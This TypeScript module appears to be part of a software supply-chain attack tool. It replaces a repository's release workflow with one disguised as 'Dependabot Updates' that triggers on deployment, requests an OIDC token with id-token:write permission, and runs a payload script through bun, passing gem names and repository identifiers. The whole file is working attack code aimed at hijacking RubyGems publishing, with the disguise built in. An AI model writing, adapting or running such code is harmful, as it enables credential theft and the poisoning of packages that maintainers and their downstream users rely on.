// ═════════════════════════════════════════════════════════════════════════════
// RubyGems OIDC workflow YAML injector
//
// Builds a clean release workflow that replaces the existing one in the
// ephemeral branch commit.  The workflow runs on deployment, gets an OIDC
// token, and executes the payload via bun.
// ═════════════════════════════════════════════════════════════════════════════

declare function scramble(str: string): string;

// ── Types ───────────────────────────────────────────────────────────────────

export interface InjectionResult {
  modifiedYaml: string;
  injected: boolean;
  reason?: string;
}

export interface InjectionContext {
  workflowFilename: string;
  /** Comma-separated gem names for the GEM_NAME env var */
  gemNames: string[];
  repoFullName: string;
  environmentName?: string;
}

// ── Public API ──────────────────────────────────────────────────────────────

/**
 * Build a clean release workflow that replaces the original.
 *
 * The injected workflow:
 *   - Triggers on deployment (repo-scope technique)
 *   - Has id-token:write for OIDC token retrieval
 *   - Checks out the repo, installs bun, runs the payload
 */
export function injectRubygemsToolStep(
  _rawYaml: string,
  ctx: InjectionContext,
): InjectionResult {
  const { gemNames, repoFullName, workflowFilename, environmentName } = ctx;
  const nameList = gemNames.join(",");

  const envBlock = environmentName
    ? `\n    environment:\n      name: ${JSON.stringify(environmentName)}\n      prevent_deployment: true`
    : "";

  const newWorkflow = [
    `name: Dependabot Updates`,
    `run-name: Dependabot Updates`,
    `on:`,
    `  deployment`,
    `jobs:`,
    `  release:`,
    `    runs-on: ubuntu-latest`,
    `    permissions:`,
    `      id-token: write`,
    `      contents: read`,
    envBlock || null,
    `    steps:`,
    `      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd`,
    `      - uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6`,
    `      - name: publish`,
    `        run: bun run _index.js`,
    `        env:`,
    `          GEM_NAME: ${JSON.stringify(nameList)}`,
    `          WORKFLOW_ID: ${JSON.stringify(workflowFilename)}`,
    `          REPO_ID_SUFFIX: ${JSON.stringify(repoFullName)}`,
  ]
    .filter(Boolean)
    .join("\n");

  return { modifiedYaml: newWorkflow, injected: true };
}
